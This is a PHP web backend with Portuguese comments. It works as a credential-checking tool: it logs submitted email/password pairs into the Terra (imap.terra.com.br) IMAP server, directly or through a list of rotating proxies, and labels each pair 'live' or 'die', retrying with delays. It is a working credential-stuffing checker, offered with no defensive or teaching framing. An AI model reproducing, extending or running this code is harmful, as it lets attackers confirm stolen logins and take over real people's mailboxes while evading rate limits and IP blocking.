<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('max_execution_time', '120');
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = $_GET['action'] ?? '';

// ── INIT — lê proxies.txt ──
if ($action === 'init') {
    $proxies = [];
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode("\n", $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    echo json_encode(['status' => 'ok', 'proxies' => array_values(array_unique($proxies))]);
    exit;
}

// ── TEST_PROXY — testa HTTPS via proxy ──
if ($action === 'test_proxy') {
    $proxy = $_POST['proxy'] ?? '';
    if (empty($proxy)) { echo json_encode(['status' => 'fail']); exit; }
    $ok = testProxyHttps($proxy);
    echo json_encode(['status' => $ok ? 'ok' : 'fail']);
    exit;
}

// ── DIAG_PROXY — diagnóstico completo ──
if ($action === 'diag_proxy') {
    $proxy = $_POST['proxy'] ?? '';
    if (empty($proxy)) { echo json_encode(['status' => 'fail', 'msg' => 'Proxy vazio']); exit; }
    $p = parseProxy($proxy);
    $diag = ['proxy' => $proxy, 'parsed' => $p, 'steps' => []];

    // Step 1: HTTPS
    $ch = curl_init();
    $opts = [
        CURLOPT_URL => 'https://api.ipify.org/',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_NOSIGNAL => 1,
        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
        CURLOPT_HTTPPROXYTUNNEL => true,
        CURLOPT_PROXYAUTH => CURLAUTH_ANY,
    ];
    if (!empty($p['user'])) { $opts[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass']; }
    curl_setopt_array($ch, $opts);
    $res = curl_exec($ch);
    $diag['steps']['https'] = [
        'ok' => $res !== false,
        'ip' => $res !== false ? trim($res) : null,
        'err' => curl_error($ch),
        'errno' => curl_errno($ch),
    ];
    curl_close($ch);

    // Step 2: IMAP
    $ch2 = curl_init();
    $opts2 = [
        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME => 'test@test.com',
        CURLOPT_PASSWORD => 'test123',
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_CONNECTTIMEOUT => 20,
        CURLOPT_NOSIGNAL => 1,
        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
        CURLOPT_HTTPPROXYTUNNEL => true,
        CURLOPT_PROXYAUTH => CURLAUTH_ANY,
        CURLOPT_VERBOSE => true,
    ];
    if (!empty($p['user'])) { $opts2[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass']; }
    $verboseLog = fopen('php://temp', 'w+');
    curl_setopt($ch2, CURLOPT_STDERR, $verboseLog);
    curl_setopt_array($ch2, $opts2);
    $res2 = curl_exec($ch2);
    rewind($verboseLog);
    $verbose = stream_get_contents($verboseLog);
    fclose($verboseLog);
    $diag['steps']['imap'] = [
        'ok' => $res2 !== false,
        'errno' => curl_errno($ch2),
        'err' => curl_error($ch2),
        'verbose' => substr($verbose, 0, 2000),
    ];
    curl_close($ch2);

    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

// ── CHECK — valida credenciais ──
if ($action === 'check') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $proxy = $_POST['proxy'] ?? '';
    if ($email === '' || $password === '') {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Vazio']);
        exit;
    }
    try {
        echo json_encode(doValidate($email, $password, $proxy));
    } catch (\Throwable $e) {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Erro']);
    }
    exit;
}

echo json_encode(['status' => 'ok']);
exit;

// ═══════════════════════════════════════
//  PARSER DE PROXY
// ═══════════════════════════════════════

function parseProxy(string $proxy): array {
    $host = ''; $port = 0; $user = ''; $pass = '';

    if (preg_match('/^(socks[45]h?|https?):\/\/([^:@]+):([^@]+)@([^:]+):(\d+)$/i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('/^([^:@]+):([^@]+)@([^:]+):(\d+)$/', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('/^(socks[45]h?|https?):\/\/([^:]+):(\d+)$/i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('/^([^:]+):(\d+)$/', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }

    return ['host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass];
}

// ═══════════════════════════════════════
//  TESTE HTTPS (valida que o proxy responde)
// ═══════════════════════════════════════

function testProxyHttps(string $proxy): bool {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;

    $ch = curl_init();
    $opts = [
        CURLOPT_URL => 'https://api.ipify.org/',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_NOSIGNAL => 1,
        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
        CURLOPT_HTTPPROXYTUNNEL => true,
        CURLOPT_PROXYAUTH => CURLAUTH_ANY,
    ];
    if (!empty($p['user'])) {
        $opts[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass'];
    }
    curl_setopt_array($ch, $opts);
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

// ═══════════════════════════════════════
//  VALIDAÇÃO — 5 TENTATIVAS COM DELAYS
// ═══════════════════════════════════════

function doValidate(string $email, string $password, string $proxy = ''): array {
    $timeout = 20;
    $delays = [0, 3000000, 6000000, 10000000, 15000000];

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        // COM proxy: HTTP CONNECT tunnel + IMAP
        if (!empty($proxy) && extension_loaded('curl')) {
            $r = tryCurlProxy($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }

        // SEM proxy: cURL direto + socket
        if (empty($proxy)) {
            if (extension_loaded('curl')) {
                $r = tryCurlDirect($email, $password, $timeout);
                if ($r !== null) return $r;
            }
            $r = trySocketDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true];
}

// ═══════════════════════════════════════
//  cURL COM PROXY (HTTP CONNECT TUNNEL)
// ═══════════════════════════════════════

function tryCurlProxy(string $email, string $password, int $timeout, string $proxy): ?array {
    $p = parseProxy($proxy);
    if (empty($p['host'])) return null;

    $ch = curl_init();
    $opts = [
        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME => $email,
        CURLOPT_PASSWORD => $password,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => $timeout,
        CURLOPT_NOSIGNAL => 1,
        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
        CURLOPT_HTTPPROXYTUNNEL => true,
        CURLOPT_PROXYAUTH => CURLAUTH_ANY,
    ];
    if (!empty($p['user'])) {
        $opts[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass'];
    }
    curl_setopt_array($ch, $opts);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);

    if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    return null;
}

// ═══════════════════════════════════════
//  cURL DIRETO (sem proxy)
// ═══════════════════════════════════════

function tryCurlDirect(string $email, string $password, int $timeout): ?array {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME => $email,
        CURLOPT_PASSWORD => $password,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => $timeout,
        CURLOPT_NOSIGNAL => 1,
    ]);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    return null;
}

// ═══════════════════════════════════════
//  SOCKET DIRETO (sem proxy)
// ═══════════════════════════════════════

function trySocketDirect(string $email, string $password, int $timeout): ?array {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    return null;
}
